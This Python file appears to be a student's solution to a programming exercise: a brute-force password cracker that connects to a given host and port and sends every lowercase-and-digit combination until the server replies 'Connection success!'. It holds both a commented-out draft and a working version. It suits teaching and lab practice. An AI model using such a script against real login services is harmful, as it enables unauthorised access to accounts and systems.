# import socket
# import sys
# import itertools
#
# args = sys.argv
# address = (args[1], int(args[2]))
# letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
#
#
# def password_generator():
#     for n in range(1, len(letters) + 1):
#         gen_obj = itertools.product(letters, repeat=n)
#         for password_tuple in gen_obj:
#             yield ''.join(password_tuple)
#
#
# client_socket = socket.socket()
# client_socket.connect(address)
# for password in password_generator():
#     client_socket.send(password.encode())
#     response = client_socket.recv(1024)
#     if response.decode() == "Connection success!":
#         client_socket.close()
#         print(password)
#         break


# write your code here
import socket
import sys
import itertools
import string


args = sys.argv
demaine_name = input('please enter demaine: ')
port = int(input('please enter port: '))

my_connection = socket.socket()
my_connection.connect((demaine_name, port))

alphabet_string = string.ascii_lowercase
num_list = [str(n) for n in range(0,10)]
alphabet_list = list(alphabet_string)
gh = 'abcdefghijklmnopqrstuvwxyz0123456789'

def code_saz():
    j = 0
    itera = 0
    while itera <= 1000000:
        j += 1
        for m in itertools.product(gh, repeat=j):
            itera += 1
            yield ''.join(list(m))

besaz = code_saz()
pass_not_found = True


while pass_not_found:
    new_pass = next(besaz)
    pass_coded = new_pass.encode()
    my_connection.send(pass_coded)
    response = my_connection.recv(1024)
    response_decoded = response.decode()
    if response_decoded == "Connection success!":
        pass_not_found = False
        print(new_pass)
        my_connection.close()
        break